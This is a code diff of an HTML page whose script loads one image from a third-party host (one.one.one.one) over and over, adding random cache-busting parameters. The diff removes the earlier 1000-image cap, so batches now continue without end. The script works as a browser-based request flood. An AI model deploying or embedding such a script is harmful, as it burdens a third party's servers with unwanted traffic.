@@ -3,9 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Controlled Image Load</title>
+  <title>Load 50 Images</title>
   <style>
-    /* Image elements are now visible to ensure requests are triggered */
+    /* Images are visible and displayed in a grid */
     img {
       display: block;
       margin: 10px;
@@ -15,54 +15,61 @@
   </style>
 </head>
 <body>
-  <h1>Loading 1000 Images...</h1>
+  <h1>Loading Images...</h1>
 
   <script>
     const baseUrl = 'https://one.one.one.one/media/card.png';
-    const imagesPerBatch = 50; // Load 50 new images once 50 previous ones have finished
-    const totalImages = 1000; // Total number of images to load
-    const container = document.createElement('div'); // Container to append images
+    const imagesPerBatch = 50; // Load 50 new images per batch
+    const loadThreshold = 25; // Load new images after 25 have successfully loaded
+    let loadedImages = 0; // Track number of successfully loaded images
+    let totalImagesLoaded = 0; // Track total images loaded
+    const container = document.createElement('div'); // Create a container to hold the images
     document.body.appendChild(container);
 
-    let loadedImages = 0; // Counter for successfully loaded images
-
-    // Function to track and load new images
+    // Function to load a batch of images
     function loadImages() {
-      // Only load new images if 50 previous images are fully loaded
-      if (loadedImages >= imagesPerBatch) {
-        loadedImages = 0; // Reset the loaded count once we load new images
+      let batchLoaded = 0; // Track images loaded in this batch
 
-        for (let i = 0; i < imagesPerBatch; i++) {
-          const img = new Image();
-          const cacheBuster = `${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
-          img.src = `${baseUrl}?cb=${cacheBuster}`; // Unique URL to bypass cache
-          
-          // Log each image request
-          console.log('Image requested:', img.src);
+      for (let i = 0; i < imagesPerBatch; i++) {
+        const img = new Image();
+        const cacheBuster = `${Date.now()}-${Math.random().toString(36).substring(2, 6)}`; // Random parameter for cache busting
+        img.src = `${baseUrl}?cb=${cacheBuster}`; // Add random parameter to avoid cache
 
-          img.onload = () => {
-            loadedImages++;
-            // Log successful image load
-            console.log('Image loaded:', img.src);
+        img.onload = () => {
+          batchLoaded++; // Increment batch load count
+          loadedImages++; // Increment total loaded images count
+          totalImagesLoaded++;
 
-            // If 50 images have been loaded, trigger the next batch load
-            if (loadedImages === imagesPerBatch) {
-              setTimeout(loadImages, 1000); // Start loading the next 50 images
+          // Log successful image load
+          console.log(`Image ${totalImagesLoaded} loaded: ${img.src}`);
+
+          // If 25 images have loaded, check if we need to load more
+          if (loadedImages >= loadThreshold) {
+            console.log("25 images loaded. Loading next batch...");
+            loadImages(); // Start loading the next batch of images
+            loadedImages = 0; // Reset the counter for the next batch
+          }
+        };
+
+        img.onerror = (error) => {
+          // Log image loading error
+          console.error(`Error loading image: ${img.src}`);
+          batchLoaded++; // Count error images to avoid blocking
+
+          // If all images in the batch have attempted to load, move to the next batch
+          if (batchLoaded === imagesPerBatch) {
+            if (loadedImages >= loadThreshold) {
+              loadImages(); // Load next batch after 25 images are loaded
+              loadedImages = 0;
             }
-          };
+          }
+        };
 
-          img.onerror = (error) => {
-            // Log errors (e.g., failed image loading)
-            console.error('Error loading image:', img.src);
-            loadedImages++; // Count the error image to prevent blocking the loop
-          };
-
-          container.appendChild(img); // Append to the DOM (forces download)
-        }
+        container.appendChild(img); // Append image to DOM (triggers load)
       }
     }
 
-    loadImages(); // Start loading images once
+    loadImages(); // Start loading the initial batch of 50 images
   </script>
 </body>
 </html>
